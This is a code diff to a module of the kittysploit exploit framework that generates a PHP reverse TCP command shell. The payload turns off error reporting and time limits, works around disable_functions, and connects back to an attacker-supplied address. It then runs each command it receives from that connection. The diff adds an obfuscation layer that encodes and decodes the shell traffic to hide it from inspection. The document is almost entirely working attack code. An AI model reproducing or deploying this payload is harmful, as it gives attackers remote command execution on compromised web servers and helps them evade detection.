@@ -2,6 +2,8 @@ from kittysploit import *
 
 
 class Module(Payload):
+
+	CLIENT_LANGUAGE = "php"
 	
 	__info__ = {
 		'name': 'PHP Command Shell, Reverse TCP',
@@ -18,11 +20,22 @@ class Module(Payload):
 	encoder = OptString("", "Encoder", False, True)
 
 	def generate(self):
+		obf = self._get_obfuscator_instance()
+		obf_code = None
+		if obf and self._is_obfuscator_compatible(obf) and hasattr(obf, "generate_client_code"):
+			obf_code = obf.generate_client_code(self._get_client_language())
+		if obf and not self._is_obfuscator_compatible(obf):
+			supported = getattr(obf, "get_supported_client_languages", lambda: [])()
+			print_warning(f"Obfuscator does not support client language 'php' (supported: {supported}). Generating without obfuscation.")
+		if not obf_code:
+			obf_code = "function _obf_encode($d){return $d;}function _obf_decode($d){return $d;}"
+
 		php_code = f"""
 @error_reporting(0);
 @set_time_limit(0);
 @ignore_user_abort(1);
 @ini_set('max_execution_time',0);
+{obf_code}
 $dis=@ini_get('disable_functions');
 if(!empty($dis)){{
   $dis=preg_replace('/[, ]+/', ',', $dis);
@@ -88,6 +101,8 @@ if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){{
   $s=@fsockopen($ipaddr,$port);
   if($s){{
     while($c=fread($s,2048)){{
+      $c=_obf_decode($c);
+      if($c===''){{continue;}}
       $out='';
       if(substr($c,0,3)=='cd '){{
         chdir(substr($c,3,-1));
@@ -100,7 +115,8 @@ if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){{
           break;
         }}
       }}
-      fwrite($s,$out);
+      $enc=_obf_encode($out);
+      fwrite($s,$enc);
     }}
     fclose($s);
   }}
@@ -109,6 +125,8 @@ if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){{
   if($s){{
     @socket_connect($s,$ipaddr,$port);
     while($c=@socket_read($s,2048)){{
+      $c=_obf_decode($c);
+      if($c===''){{continue;}}
       $out='';
       if(substr($c,0,3)=='cd '){{
         chdir(substr($c,3,-1));
@@ -121,7 +139,8 @@ if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){{
           break;
         }}
       }}
-      @socket_write($s,$out,strlen($out));
+      $enc=_obf_encode($out);
+      @socket_write($s,$enc,strlen($enc));
     }}
     @socket_close($s);
   }}
@@ -132,4 +151,3 @@ if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){{
 		payload = php_code.replace('\n', '').replace('  ', ' ').strip()
 		
 		return payload
-
